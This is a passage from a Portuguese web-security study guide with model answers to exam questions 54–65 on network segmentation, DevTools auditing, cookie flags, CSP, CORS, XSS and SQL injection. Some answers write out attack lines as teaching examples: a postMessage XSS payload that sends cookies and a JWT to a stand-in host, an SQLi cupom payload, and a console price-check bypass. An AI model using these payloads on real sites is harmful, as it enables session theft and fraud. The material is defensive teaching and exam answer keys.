   - **Contra BOLA/IDOR:** Extrair o `usuario_id` exclusivamente da sessão/token validado no servidor e incluí-lo obrigatoriamente na cláusula da consulta (`WHERE id = $1 AND cliente_id = $2`), retornando `404` ou `403` caso não pertença ao usuário; usar **UUIDv4** como defesa complementar contra enumeração sequencial.
   - **Contra Excessive Data Exposure:** Aplicar **DTOs de Saída (*Output DTOs* / Serializadores explícitos)** e `SELECT` apenas das colunas estritamente necessárias.
   - **Contra Mass Assignment:** Aplicar **DTOs de Entrada (*Input Validation Schemas* com *allowlist* estrita de campos, ex.: Zod / Joi)**, extraindo apenas `{ nome, telefone }` e ignorando/rejeitando qualquer propriedade adicional.

##### Padrão de Resposta da Questão 54 (Arquitetura de Redes: CIDR, NAT, Firewall, Proxy Reverso, WAF e Portas)
1. **Segmentação em Sub-redes Privadas (RFC 1918) e Cálculo CIDR `/27` ([Seção 4.4.2](./04-redes-de-computadores.md#s4-4-2) e [Seção 4.4.3](./04-redes-de-computadores.md#s4-4-3)):**
   - Utilizando o bloco privado **`10.10.0.0/16`**:
     - **Sub-rede Pública / DMZ (Proxy Reverso / WAF):** `10.10.1.0/24`
     - **Sub-rede Privada de Aplicação (Node.js):** `10.10.2.0/24`
     - **Sub-rede Privada Isolada de Dados (PostgreSQL):** `10.10.3.0/27`
   - **Cálculo da sub-rede `/27` (`10.10.3.0/27`):**
     - Bits de host: $h = 32 - 27 = 5$ bits.
     - Máscara decimal: **`255.255.255.224`**.
     - Endereço de Rede: `10.10.3.0` | Broadcast: `10.10.3.31` | Hosts úteis: `10.10.3.1` a `10.10.3.30` ($2^5 - 2 =$ **`30` hosts válidos**).
2. **Papel do Proxy Reverso, WAF, Firewall Stateful e NAT ([Seção 4.5.4](./04-redes-de-computadores.md#s4-5-4) e [Seção 4.6](./04-redes-de-computadores.md#s4-6)):**
   - **Proxy Reverso (Camada 7):** Recebe as conexões dos clientes da Internet, realiza terminação TLS (`HTTPS :443`), oculta os IPs reais dos servidores Node.js internos, faz balanceamento de carga, compressão e adiciona headers de segurança.
   - **WAF (*Web Application Firewall* — Camada 7):** Inspeciona o tráfego HTTP/HTTPS descriptografado em busca de assinaturas e anomalias de ataques de aplicação (SQLi, XSS, SSRF, Path Traversal, *Rate Limiting*).
   - **Firewall Stateful (Camadas 3 e 4):** Controla o fluxo de pacotes entre as sub-redes (DMZ $\rightarrow$ App $\rightarrow$ DB) mantendo uma tabela de estado das conexões TCP/UDP ativas e aplicando a política **Default Deny** (tudo o que não é explicitamente permitido é bloqueado).
   - **NAT (*Network Address Translation*):** Traduz os endereços IP privados (RFC 1918) para o IP público de borda quando servidores internos precisam buscar atualizações externas (SNAT/PAT), impedindo conexões diretas de fora para dentro nas sub-redes privadas.
3. **Política de Portas de Rede ([Seção 4.7](./04-redes-de-computadores.md#s4-7)):**
   - **Expostas para a Internet (apenas na DMZ / Proxy Reverso):** Porta **`443` (TCP/UDP — HTTPS)** e porta **`80` (TCP — HTTP)** configurada exclusivamente para redirecionar `301 Moved Permanently` para `https://`.
   - **Bloqueadas para a Internet e restritas internamente:**
     - Porta **`8080` (TCP — Node.js):** Aceita conexões **somente** a partir do IP interno do Proxy Reverso na DMZ.
     - Porta **`5432` (TCP — PostgreSQL):** Aceita conexões **somente** a partir da sub-rede privada dos servidores de aplicação (`10.10.2.0/24`). Jamais exposta à DMZ ou à Internet!
     - Porta **`22` (TCP — SSH):** Bloqueada na borda pública; acessível **exclusivamente** a partir da sub-rede de gerência via **VPN corporativa** com autenticação por chave pública criptográfica e MFA.

##### Padrão de Resposta da Questão 55 (Limitações da Auditoria pelo Navegador: Caixa-Preta vs. Caixa-Branca)
1. **Cinco classes de falhas detectáveis diretamente pelo Chrome DevTools ([Seção 6.1 a 6.3](./06-checklist-e-comparativo.md#s6)):**
   1. Ausência de HTTPS, *Mixed Content* e certificados TLS fracos ou inválidos (Aba **Network** / **Security**).
   2. Cookies inseguros sem as flags `HttpOnly`, `Secure` ou `SameSite` adequado (Aba **Application** / **Network**).
   3. Armazenamento indevido de tokens JWT, senhas ou PII em `localStorage`, `sessionStorage`, `IndexedDB` ou `Cache Storage` (Aba **Application**).
   4. Ausência ou má configuração de cabeçalhos de segurança (`CSP`, `HSTS`, `X-Content-Type-Options`, `X-Frame-Options`, `Referrer-Policy`) e permissividade excessiva de `CORS` (Aba **Network** / **Console**).
   5. Exposição excessiva de dados em respostas JSON (*Excessive Data Exposure*), vazamento de versões/stack traces em erros `500`, logs esquecidos em `console.log()` e vulnerabilidades de DOM-Based XSS no código JavaScript do cliente (Abas **Network** e **Console**).
2. **Cinco classes de vulnerabilidades invisíveis apenas pela inspeção passiva no navegador ([Seção 6.4](./06-checklist-e-comparativo.md#s6-4)):**
   1. **Armazenamento criptográfico no servidor:** Impossível saber pelo navegador se o banco de dados armazena senhas com `Argon2id` + salt ou em texto claro / `MD5` (a menos que a API vaze o hash).
   2. **Validação criptográfica de JWT no back-end:** Sem testes ativos ou revisão de código, o navegador não mostra se o servidor aceita `"alg": "none"` ou sofre de confusão `RS256`/`HS256`.
   3. **SQL Injection Cego (*Blind SQLi*) ou em rotinas assíncronas (*Second-Order SQLi*):** Falhas em filas internas (Kafka/RabbitMQ), *cron jobs* ou webhooks internos não aparecem no DevTools do usuário comum.
   4. **Vulnerabilidades em dependências de back-end (SCA) e configuração de infraestrutura:** Bibliotecas Python/Java/Node desatualizadas com CVEs críticas no servidor, buckets S3 mal configurados ou portas de banco de dados (`3306`/`5432`) abertas no firewall para a Internet.
   5. **Condições de corrida (TOCTOU) e falhas de lógica em microsserviços internos:** Problemas de concorrência transacional e falta de autenticação mútua entre microsserviços internos.
3. **Combinação em um Programa de Segurança Completo (DevSecOps):**
   - Unir a auditoria manual no navegador (**Chrome DevTools**) com: **SAST** (análise estática do código-fonte back-end e front-end no CI/CD), **SCA** (auditoria de vulnerabilidades em bibliotecas de terceiros e containers), **DAST** (scanners dinâmicos automatizados), **IaC Scanning** (verificação de firewall, nuvem e Kubernetes) e **Pentest / Revisão de Arquitetura (Caixa-Branca e Caixa-Cinza)** em ambientes autorizados.


---

<a id="s9-5-7"></a>
#### 9.5.7 Padrão de Resposta da Banca: Interpretação do Chrome DevTools (Questões 56 a 65)

##### Padrão de Resposta da Questão 56 (Prática DevTools — Aba Network: Login via GET, HTTP, Cookie e Open Redirect)
1. **Identificação das vulnerabilidades na captura da Aba Network ([Seção 2.1.9](./02a-devtools-network.md#s2-1-9)):**
   1. **Transmissão sem criptografia (`http://` na porta `:80`):** E-mail, senha, CPF e cookie de sessão trafegam em texto claro na rede, sujeitos a interceptação trivial (*sniffing* / *Man-in-the-Middle*).
   2. **Credenciais e PII na URL via método `GET` (`?email=...&senha=...&cpf=...`):** Senhas e CPFs na *Query String* ficam salvos no histórico do navegador, nos logs de acesso do Apache/Proxies, em ferramentas de *analytics* e no cabeçalho `Referer`.
   3. **Open Redirect (*Redirecionamento Aberto* — [Seção 3.13](./03b-vulnerabilidades-parte2.md#s3-13)):** O parâmetro `next=http://sorteio-externo.test/resgate` é refletido diretamente no cabeçalho `Location: http://sorteio-externo.test/resgate` do `302 Found`, permitindo ataques de *phishing* pós-autenticação.
   4. **Política `Referrer-Policy: unsafe-url` ([Seção 5.5](./05-headers-de-seguranca.md#s5-5)):** É a configuração mais perigosa possível, pois obriga o navegador a enviar a URL completa de origem (incluindo a *Query String* com a senha e o CPF!) no cabeçalho `Referer` para qualquer site externo, mesmo em conexões HTTP inseguras.
   5. **Cookie de sessão totalmente desprotegido (`Set-Cookie: PHPSESSID=...; path=/`):** Ausência das flags **`HttpOnly`** (vulnerável a roubo via XSS), **`Secure`** (enviado em HTTP plano) e **`SameSite`** (vulnerável a CSRF).
   6. **Exposição de versões no servidor (*Banner Grabbing* — [Seção 1.6.4](./01a-fundamentos-web-parte1.md#s1-6-4)):** Os cabeçalhos `Server: Apache/2.4.29 (Ubuntu) OpenSSL/1.1.1` e `X-Powered-By: PHP/7.2.10` expõem versões antigas e com CVEs conhecidas.
   7. **Ausência de Headers de Segurança:** Faltam `Strict-Transport-Security` (HSTS), `Content-Security-Policy`, `X-Content-Type-Options`, `X-Frame-Options` e `Cache-Control: no-store`.
2. **Amplificação do vazamento pela combinação `unsafe-url` + `Open Redirect`:**
   - Ao seguir o redirecionamento `302 Found` para `http://sorteio-externo.test/resgate`, o navegador aplica `Referrer-Policy: unsafe-url` e envia ao servidor externo do atacante o cabeçalho:
     `Referer: http://loja-ficticia.test/auth/login?email=ana.silva%40exemplo.test&senha=MinhaSenh@2026!&cpf=12345678900&next=...`
     Ou seja, o servidor externo recebe automaticamente o e-mail, a senha em texto claro e o CPF da vítima nos seus próprios logs HTTP!
3. **Requisição e Resposta Corrigidas ([REQUISITO]):**
   ```http
   === REQUISIÇÃO CORRIGIDA (POST sobre HTTPS com credenciais no corpo e destino relativo) ===
   POST https://loja-ficticia.test/auth/login HTTP/2
   Host: loja-ficticia.test
   Content-Type: application/json
   
   {"email": "ana.silva@exemplo.test", "senha": "MinhaSenh@2026!", "next": "/minha-conta"}

   === RESPOSTA CORRIGIDA ===
   HTTP/2 303 See Other
   Location: /minha-conta
   Set-Cookie: __Host-sessao=9f8e7d6c5b4a3f2e1d0c9b8a; Path=/; Secure; HttpOnly; SameSite=Strict
   Cache-Control: no-store, no-cache, must-revalidate
   Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
   Referrer-Policy: strict-origin-when-cross-origin
   X-Content-Type-Options: nosniff
   X-Frame-Options: DENY
   Content-Security-Policy: default-src 'self'; frame-ancestors 'none'
   ```

##### Padrão de Resposta da Questão 57 (Prática DevTools — Aba Network: Excessive Data Exposure, MD5 e Cache Público)
1. **Vulnerabilidade no Payload JSON e análise do hash ([Seção 1.10](./01b-fundamentos-web-parte2.md#s1-10), [Seção 2.1.9](./02a-devtools-network.md#s2-1-9) e [Seção 3.8](./03a-vulnerabilidades-parte1.md#s3-8)):**
   - Caracteriza **Excessive Data Exposure** (*Exposição Excessiva de Dados* — incluída em *Broken Object Property Level Authorization* no OWASP API Security) combinada a **Cryptographic Failures**.
   - **Dados que jamais deveriam estar na resposta:** `cpf`, `senha_hash`, `cartao_credito_numero` (PAN completo sem mascaramento, violando o padrão PCI-DSS), `cartao_cvv` (código de segurança que jamais pode ser armazenado após a autorização, muito menos retornado em API!) e todo o bloco `config_interna_gateway` contendo a chave privada `rk_live_...` de produção.
   - **Análise do `senha_hash` (`e10adc3949ba59abbe56e057f20f883e`):** Trata-se de um hash **MD5** de 32 caracteres hexadecimais sem *salt* (inclusive é o conhecido MD5 de `"123456"`), extremamente vulnerável a *Rainbow Tables* e força bruta em GPUs.
2. **Impacto de `cache-control: public, max-age=86400` + `access-control-allow-origin: *`:**
   - `cache-control: public, max-age=86400` autoriza proxies compartilhados, CDNs e o disco do navegador a armazenarem esse JSON repleto de dados de cartão e chaves privadas por 24 horas como conteúdo público (**Web Cache Poisoning / Cacheamento Indevido** — [Seção 1.13.3](./01b-fundamentos-web-parte2.md#s1-13-3)).
   - `access-control-allow-origin: *` permite que qualquer site malicioso na Internet faça um `fetch()` para essa URL cacheada e leia todos os dados.
   - Adicionalmente, `server: Microsoft-IIS/10.0` e `x-aspnet-version: 4.0.30319` expõem a pilha de tecnologia do servidor.
3. **Teste de BOLA/IDOR e Correção no Back-End:**
   - **Teste autorizado:** Alterar o parâmetro `?id=402` para `?id=401` ou `?id=403` na aba **Network / Console** para verificar se a API retorna pedidos e cartões de outros clientes sem validar `comprador.usuario_id === sessao.usuario_id`.
   - **Correção ([REQUISITO]):** Validar no back-end que o pedido `402` pertence ao usuário autenticado na sessão; criar um **DTO de Saída** retornando exclusivamente `{ pedido_id, status, valor_total, itens }`; migrar hashes de senha para **Argon2id** (nunca os selecionando em consultas de pedidos); remover chaves privadas do JSON; substituir por `Cache-Control: no-store` e remover `Access-Control-Allow-Origin: *`.

##### Padrão de Resposta da Questão 58 (Prática DevTools — Aba Network: Diagnóstico de CORS Preflight e Credenciais)
1. **Por que o navegador disparou a requisição Preflight (`OPTIONS`) ([Seção 1.11.2](./01b-fundamentos-web-parte2.md#s1-11-2)):**
   - Uma requisição deixa de ser uma *requisição simples* (*simple request*) e exige **Preflight (`OPTIONS`)** quando utiliza um `Content-Type` fora da lista simples (`application/json` não é simples; apenas `application/x-www-form-urlencoded`, `multipart/form-data` e `text/plain` o são) e também porque enviou um cabeçalho customizado não listado na *safelist* (`X-Client-Version: 2.4`).
2. **Por que o Cenário A falhou e por que o Cenário B é vulnerável ([Seção 5.10](./05-headers-de-seguranca.md#s5-10) e [Seção 5.11](./05-headers-de-seguranca.md#s5-11)):**
   - **Cenário A:** Como o `fetch` configurou `credentials: 'include'`, o navegador exige por especificação que o cabeçalho `Access-Control-Allow-Origin` na resposta do preflight (e da requisição real) contenha a **origem exata** (`https://app.painel-ficticio.test`), rejeitando o curinga `*`.
   - **Cenário B:** Ao refletir cegamente qualquer `Origin` recebido (inclusive `https://malicioso.exemplo.test`) junto com `Access-Control-Allow-Credentials: true`, o desenvolvedor permitiu que qualquer site malicioso realize transferências autenticadas com o cookie da vítima e leia a resposta da API.
3. **Cabeçalhos HTTP de Resposta Seguros ([REQUISITO]):**
   ```http
   Access-Control-Allow-Origin: https://app.painel-ficticio.test
   Access-Control-Allow-Credentials: true
   Access-Control-Allow-Methods: POST, OPTIONS
   Access-Control-Allow-Headers: Content-Type, X-Client-Version
   Access-Control-Max-Age: 600
   Vary: Origin
   ```

##### Padrão de Resposta da Questão 59 (Prática DevTools — Aba Network: Colunas, Cache, Size e Timing)
1. **Por que `DNS Lookup`, `Initial Connection` e `SSL` foram `0 ms` ([Seção 2.1.6](./02a-devtools-network.md#s2-1-6) e [Seção 2.1.7](./02a-devtools-network.md#s2-1-7)):**
   - A coluna `Protocol` mostra que todas as requisições para `loja-ficticia.test` (`198.51.100.10:443`) utilizam **HTTP/2 (`h2`)**. O navegador abriu a conexão TCP e negociou o TLS 1.3 apenas na primeira requisição (`index.html`) e **reutilizou a mesma conexão persistente e multiplexada** (*Reused connection* / mesmo `Connection ID`) para buscar `busca?filtro=notebooks`, economizando totalmente o tempo de DNS, TCP handshake e TLS handshake.
2. **Diferença de Cache e de `Size` (`Transfer Size` vs. `Resource Size`) ([Seção 2.1.8](./02a-devtools-network.md#s2-1-8)):**
   - **`index.html` (`200`, `14.2 kB / 52.0 kB`):** Baixado integralmente do servidor. Trafegaram **`14.2 kB`** comprimidos na rede (**Transfer Size**), que após a descompressão Gzip/Brotli no navegador resultaram em **`52.0 kB`** de HTML (**Resource Size**).
   - **`app.bundle.js` (`200`, `(disk cache)`):** Atendido diretamente pelo cache em disco do navegador (`Cache-Control: max-age=...` ainda fresco), sem enviar nenhum byte pela rede (`2 ms`).
   - **`logo.svg` (`304 Not Modified`, `180 B / 18.4 kB`):** O cache local estava expirado ou exigia revalidação (`no-cache`); o navegador enviou uma requisição condicional com `If-None-Match` (`ETag`), o servidor respondeu apenas os cabeçalhos (`180 B` de *Transfer Size*) com `304 Not Modified` sem reenviar o corpo, e o navegador reutilizou os `18.4 kB` (*Resource Size*) já salvos localmente.
3. **Diagnóstico dos `6.240 ms` em `busca?filtro=notebooks`:**
   - **Etapa crítica:** `Waiting for server response (TTFB)` consumiu **`6.236,20 ms`** (99,9% do tempo total), enquanto o envio (`0.30 ms`) e o download do JSON (`1.50 ms` para `1.1 kB`) foram instantâneos.
   - **Ótica de Performance:** Consulta SQL pesada sem índice na coluna `filtro` (ex.: `LIKE '%notebooks%'` em tabela gigante) ou contenção de recursos no back-end.
   - **Ótica de Segurança:** Forte indicador de teste/exploração de **Time-Based Blind SQL Injection** (ex.: payload injetando `SLEEP(6)` ou `pg_sleep(6)` no parâmetro `filtro`) ou ataque de negação de serviço por expressão regular (**ReDoS**).

##### Padrão de Resposta da Questão 60 (Prática DevTools — Aba Application: Auditoria da Tabela de Cookies)
1. **Falhas técnicas em `auth_session`, `__Host-token` e `admin_flag` ([Seção 2.2.5](./02b-devtools-application.md#s2-2-5) e [Seção 2.2.6](./02b-devtools-application.md#s2-2-6)):**
   - **`auth_session`:** (a) Não possui `HttpOnly` (vulnerável a roubo de sessão via XSS); (b) Não possui `Secure` (pode vazar em HTTP); (c) Configura `SameSite=None` **sem** a flag `Secure` — navegadores modernos **rejeitam e bloqueiam** automaticamente qualquer cookie `SameSite=None` que não tenha `Secure`; (d) Possui validade excessiva de 1 ano para uma sessão bancária e escopo amplo `.banco-ficticio.test`.
   - **`__Host-token`:** Viola duas regras obrigatórias do prefixo `__Host-`: (a) a flag `Secure` está desmarcada; (b) possui `Domain=.banco-ficticio.test` definido e `Path=/app` (quando `__Host-` exige **ausência** de `Domain` e `Path=/` obrigatório). Por violar o contrato do prefixo, o navegador **rejeita** o cookie.
   - **`admin_flag` (`Value: false`):** Falha grave de controle de acesso no cliente (*Security Misconfiguration / Broken Access Control* — [Seção 3.5](./03a-vulnerabilidades-parte1.md#s3-5)). Além de não ter `HttpOnly`, `Secure` nem `SameSite` explícito, armazenar `admin_flag=false` em texto claro sem assinatura permite que o próprio usuário dê duplo clique na célula `Value` da aba **Application > Cookies**, mude para `true` e escale privilégios caso o back-end confie nesse cookie!
2. **Avaliação de `preferencia_ui` e `chat_widget` (com `Partition Key` / CHIPS):**
   - **`preferencia_ui`:** Adequado. Guarda apenas preferência visual não sensível (`dark_mode`), pode ser lido pelo JS do tema (por isso não requer `HttpOnly`), possui `Secure` e `SameSite=Lax` e está restrito ao host `banco-ficticio.test`.
   - **`chat_widget`:** Adequado para um widget de suporte embarcado em `<iframe>` de terceiro (`.suporte-terceiro.test`). Possui `HttpOnly`, `Secure`, `SameSite=None` e utiliza **CHIPS (`Partitioned`)** com `Partition Key = https://banco-ficticio.test`, garantindo que esse cookie de terceiro seja isolado exclusivamente para quando o widget estiver dentro do site do banco, impedindo rastreamento *cross-site* em outros sites da web.
3. **Cabeçalho `Set-Cookie` Corrigido para a Sessão Bancária ([REQUISITO]):**
   ```http
   Set-Cookie: __Host-auth_session=f98a77b65c43d21e0099a1b2c3d4e5f6; Path=/; Secure; HttpOnly; SameSite=Strict; Max-Age=1800
   ```

##### Padrão de Resposta da Questão 61 (Prática DevTools — Aba Application: Local Storage e IndexedDB na Clínica)
1. **Falhas de segurança no `Local Storage`, no `jwt_token` e no `IndexedDB` ([Seção 1.7.3](./01b-fundamentos-web-parte2.md#s1-7-3), [Seção 2.2.3](./02b-devtools-application.md#s2-2-3) e [Seção 2.2.4](./02b-devtools-application.md#s2-2-4)):**
   - **No `Local Storage`:**
     1. Armazenamento de `jwt_token` e `refresh_token` (`never_expires`) expostos a qualquer script via XSS.
     2. Armazenamento da senha em texto claro (`lembrar_senha_texto_claro: Clinica@2026!`), violação crítica de segurança.
   - **Dentro do próprio `jwt_token` decodificado:**
     1. Inclusão do claim `"senha_md5": "81dc9bdb52d04dc20036dbd8313ed055"` no *payload* do JWT (lembrando que Base64URL é legível por qualquer um e o hash ainda usa MD5 inseguro — correspondente a `"1234"`).
     2. Tempo de expiração abusivo (`"exp": 1999999999` $\rightarrow$ ano de 2033!), impedindo expiração curta.
   - **No `IndexedDB` (`ProntuariosDB`):**
     1. Persistência local não criptografada em disco de dados pessoais sensíveis de saúde (CPF, nome, CID de diagnóstico médico e Cartão SUS — protegidos pela LGPD) de múltiplos pacientes, ficando expostos em computadores compartilhados do consultório ou a scripts XSS.
2. **O que pode permanecer e como redesenhar a arquitetura ([REQUISITO]):**
   - **Único item adequado no `Local Storage`:** `tema_interface: claro` (preferência de UI não sensível).
   - **Redesenho seguro:** (a) Remover imediatamente senhas do cliente e hashes do payload do JWT; (b) Emitir sessão/refresh token em cookie `__Host-session` com `HttpOnly; Secure; SameSite=Strict` e expiração curta (ex.: 15 minutos para access token em memória e rotação de refresh token); (c) Buscar prontuários médicos sob demanda da API via HTTPS com `Cache-Control: no-store`, mantendo-os apenas em memória durante a visualização e limpando todo o estado no logout com `Clear-Site-Data: "cache", "cookies", "storage"`.

##### Padrão de Resposta da Questão 62 (Prática DevTools — Aba Application: Service Workers e Cache Storage)
1. **Causa da persistência dos dados financeiros após o Logout ([Seção 2.2.1](./02b-devtools-application.md#s2-2-1) e [Seção 2.2.7](./02b-devtools-application.md#s2-2-7)):**
   - O arquivo `sw-cache-tudo.js` interceptou todas as requisições `fetch` da página — inclusive as chamadas autenticadas `/api/v1/conta/resumo-financeiro` e `/api/v1/conta/chaves-pix-e-documentos` — e clonou suas respostas JSON `200 OK` para dentro da API **Cache Storage** (`cache-v1`). Como o **Cache Storage** é persistido em disco por origem e não é apagado automaticamente quando o cookie de sessão expira no servidor, os dados bancários permaneceram salvos localmente no computador público.
2. **Uso dos controles da Aba Application pelo auditor:**
   - Em **Application > Service Workers**, marcar o checkbox **`Bypass for network`** força o navegador a ignorar o Service Worker e buscar diretamente na rede (comprovando que o servidor já retornaria `401 Unauthorized` após o logout, enquanto o Service Worker entregava a cópia antiga do cache). O botão **`Unregister`** remove o registro do Service Worker.
   - Em **Application > Storage**, clicar no botão **`Clear site data`** apaga simultaneamente o Cache Storage, Service Workers, Cookies e Web Storage para validar a limpeza.
3. **Correções no código do Service Worker, nos Headers da API e no Logout ([REQUISITO]):**
   - **No Service Worker (`sw.js`):** Restringir o cache exclusivamente a uma lista de ativos estáticos públicos (`/assets/*.css`, `/assets/*.js`, fontes/ícones); jamais interceptar ou armazenar rotas `/api/*` ou respostas que contenham `Cache-Control: no-store` / `private`.
   - **Nos Headers HTTP da API (`/api/v1/conta/*`):** Enviar obrigatoriamente `Cache-Control: no-store, no-cache, must-revalidate, private`.
   - **No Fluxo de Logout:** O servidor deve responder ao `POST /logout` com o cabeçalho **`Clear-Site-Data: "cache", "cookies", "storage"`**, e o cliente deve invocar `await caches.delete('cache-v1')`.

##### Padrão de Resposta da Questão 63 (Prática DevTools — Aba Console: Violações de CSP, `eval()` e XSS)
1. **Diagnóstico do `[Erro 1]` e atuação salvadora do CSP ([Seção 2.3.4](./02c-devtools-console.md#s2-3-4), [Seção 2.3.5](./02c-devtools-console.md#s2-3-5) e [Seção 5.1](./05-headers-de-seguranca.md#s5-1)):**
   - O `[Erro 1]` comprova que a página possui uma vulnerabilidade real de **Stored/DOM XSS** no arquivo `comentario-render.js:28` (provavelmente renderizando comentários de usuários com `innerHTML`), por onde um atacante injetou `<script src="https://malicioso-tracker.test/roubo-sessao.js"></script>`.
   - Graças ao cabeçalho **`Content-Security-Policy: script-src 'self' 'nonce-7a8b9c0d1e2f'`**, o navegador **bloqueou o carregamento e a execução do script malicioso**, impedindo o roubo da sessão e registrando a tentativa no Console!
2. **Causa do `[Erro 2]` e do `[Erro 3]` no código legítimo:**
   - **`[Erro 2]`:** O botão HTML na linha `145` usa um manipulador de eventos inline (`onclick="adicionarCarrinho(99)"`). Sob uma política CSP com `nonce` (sem `'unsafe-inline'`), atributos de evento inline (`onclick`, `onload`, `onerror`) são bloqueados porque o navegador não tem como distinguir um `onclick` legítimo de um `onerror` injetado por XSS.
   - **`[Erro 3]`:** O script `calculadora-preco.js:54` utiliza `eval()` (ou `new Function()`), que é bloqueado por padrão pelo CSP quando a diretiva `'unsafe-eval'` não está presente.
3. **Por que a sugestão do desenvolvedor júnior é desastrosa e como corrigir o código ([REQUISITO]):**
   - Alterar o CSP para `script-src * 'unsafe-inline' 'unsafe-eval'` destruiria toda a proteção e permitiria que o ataque de XSS do `[Erro 1]` (`roubo-sessao.js`) fosse executado imediatamente contra todos os clientes!
   - **Correções no código (mantendo o CSP estrito):**
     1. Em `comentario-render.js:28`: Substituir `elemento.innerHTML = comentario` por **`elemento.textContent = comentario`** (eliminando a vulnerabilidade XSS na raiz).
     2. Em `produto/99:145`: Remover o atributo `onclick` do HTML (`<button id="btn-comprar" data-id="99">Comprar</button>`) e registrar o evento em um arquivo JS externo (ou `<script nonce="...">`) com **`addEventListener('click', ...)`**.
     3. Em `calculadora-preco.js:54`: Substituir o `eval()` por operações matemáticas nativas em JavaScript (`Number(preco) / Number(parcelas)`).

##### Padrão de Resposta da Questão 64 (Prática DevTools — Aba Console: `console.log`, SQLi em Erro `500` e Validação no Cliente)
1. **Quatro vulnerabilidades graves evidenciadas na Aba Console ([Seção 2.3.5](./02c-devtools-console.md#s2-3-5)):**
   1. **Exposição de segredos e credenciais em `console.log()` em produção (`checkout.js:14` e `:29`):** Vazamento de uma chave secreta real de servidor de pagamentos (`sk_live_51N9xYz...` — que jamais pode existir no bundle front-end!) e de um `token_interno: "adm_secret_8812"`.
   2. **Controle de acesso e validação de preço apenas no Front-End (`checkout.js:88`):** Confiar em uma variável global `window.permitirDescontoVIP` e enviar o preço final calculado pelo cliente (`precoTotal * 0.5`) para o servidor (**Insecure Design / Broken Access Control**).
   3. **SQL Injection Baseado em Erro (`CupomDAO.java:77`):** A entrada `PROMO10'` quebrou a sintaxe da consulta `SELECT ... WHERE codigo = 'PROMO10'' AND ativo = true`, provando concatenação direta de strings SQL.
   4. **Security Misconfiguration / Vazamento de Stack Trace em Erro `500` (`checkout.js:112`):** O servidor retornou a exceção completa do driver PostgreSQL (`org.postgresql.util.PSQLException`), revelando o SGBD, o nome exato da tabela (`tb_cupons_desconto`), as colunas (`id, percentual, ativo, codigo`) e os pacotes/linhas do código Java.
2. **Como seriam exploradas pelo Console / Laboratório Autorizado:**
   - **Bypass da validação no cliente:** Qualquer usuário abre a aba **Console** (REPL), digita `window.permitirDescontoVIP = true;` (ou chama diretamente `enviarPedidoComPreco(0.01)` no Console) e finaliza a compra pela metade do preço.
   - **Teste de SQL Injection em laboratório:** Enviar no campo de cupom o payload `' OR ativo = true LIMIT 1 -- ` para forçar a aplicação do primeiro cupom ativo cadastrado na tabela `tb_cupons_desconto` sem conhecer seu código.
3. **Plano Completo de Correção ([REQUISITO]):**
   - **Revogar imediatamente** a chave `sk_live_...` exposta e movê-la exclusivamente para variáveis de ambiente no servidor back-end; remover `console.log` de dados sensíveis no pipeline de build.
   - **No cálculo do pedido:** O cliente deve enviar apenas os IDs dos produtos e o código do cupom; o **servidor back-end** deve consultar o preço real no banco de dados e verificar na sessão do servidor se o usuário possui direito a desconto VIP.
   - **No `CupomDAO.java`:** Reescrever a consulta utilizando **`PreparedStatement`** (`SELECT id, percentual, ativo FROM tb_cupons_desconto WHERE codigo = ? AND ativo = true`).
   - **No tratamento de erros:** Configurar um *Exception Handler* global no back-end para logar o stack trace internamente e retornar ao cliente apenas `500 Internal Server Error` com `{"erro": "Erro interno ao processar a solicitação"}`.

##### Padrão de Resposta da Questão 65 (Prática DevTools — Incidente Integrado nas 3 Abas: Network + Application + Console)
1. **Reconstrução passo a passo da Cadeia de Ataque (*Kill Chain*):**
   - **Passo 1 — Vetor de Entrada (`postMessage` inseguro na Evidência 1):** O script `notificacoes-widget.js:19` registra `window.addEventListener('message', ...)` sem validar **`event.origin`** ([Seção 1.9.2](./01b-fundamentos-web-parte2.md#s1-9-2)) e joga `event.data.htmlMensagem` diretamente no sumidouro **`container.innerHTML`** ([Seção 1.9.1](./01b-fundamentos-web-parte2.md#s1-9-1)).
   - **Passo 2 — Exploração de DOM-Based XSS:** Uma página externa controlada pelo atacante abre o portal (ou o embute em um `<iframe>`) e dispara `alvo.postMessage({ htmlMensagem: '<img src=x onerror="fetch(\'https://telemetria-externa-suspeita.test/coletor?c=\'+encodeURIComponent(document.cookie)+\'&j=\'+localStorage.getItem(\'api_bearer_jwt\'))">' }, '*')`.
   - **Passo 3 — Coleta das Credenciais (Evidência 2 — Aba Application):** Quando o `innerHTML` processa a tag `<img onerror=...>`, o JavaScript injetado executa na origem `https://portal.empresa-ficticia.test`. Como o cookie `SESSION_PORTAL` **não tem a flag `HttpOnly`** e o JWT `api_bearer_jwt` está salvo no **`Local Storage`**, o script malicioso lê ambos sem qualquer impedimento.
   - **Passo 4 — Exfiltração Comprovada (Evidência 3 — Aba Network):** O script dispara a requisição `GET` para `https://telemetria-externa-suspeita.test/coletor?c=SESSION_PORTAL...&j=eyJhbG...`. A coluna **`Initiator`** da aba **Network** (`notificacoes-widget.js:21`) aponta exatamente para a linha onde `container.innerHTML` foi atribuído, fechando o nexo causal forense entre as três abas do DevTools!
2. **Cinco Medidas de Correção e Defesa em Profundidade ([REQUISITO]):**
   1. **Validação estrita de `event.origin` no `postMessage`:** Verificar `if (event.origin !== 'https://notificacoes.empresa-ficticia.test') return;` antes de processar qualquer mensagem.
   2. **Eliminação do *sink* inseguro `innerHTML`:** Substituir `container.innerHTML` por **`container.textContent`** (ou sanitizar com `DOMPurify.sanitize()` + *Trusted Types*).
   3. **Endurecimento do Cookie de Sessão:** Configurar `Set-Cookie: __Host-SESSION_PORTAL=...; Path=/; Secure; HttpOnly; SameSite=Strict`, impedindo a leitura via `document.cookie`.
   4. **Remoção do JWT do `Local Storage`:** Eliminar o armazenamento de tokens de acesso/sessão no `localStorage`, utilizando cookies `HttpOnly` ou memória volátil isolada.
   5. **Implementação de `Content-Security-Policy` (CSP) com `script-src` e `connect-src` restritos:** Configurar `Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-...'; connect-src 'self' https://api.empresa-ficticia.test; frame-ancestors 'none';` — o que teria bloqueado tanto a execução do `onerror` inline quanto a conexão de exfiltração (`fetch`) para o domínio `https://telemetria-externa-suspeita.test`!


---

<a id="s10"></a>
## 10. Fontes e Referências Bibliográficas

Esta seção reúne a documentação primária oficial, as especificações normativas de padrões da Internet, os guias de segurança de aplicações e a bibliografia acadêmica de referência utilizados na elaboração desta apostila. Para aprofundamento e verificação contínua (especialmente diante da evolução mensal dos navegadores e padrões web), consulte diretamente as fontes listadas a seguir.

<a id="s10-1"></a>
### 10.1 Documentação Oficial do Chrome DevTools e Google Chrome

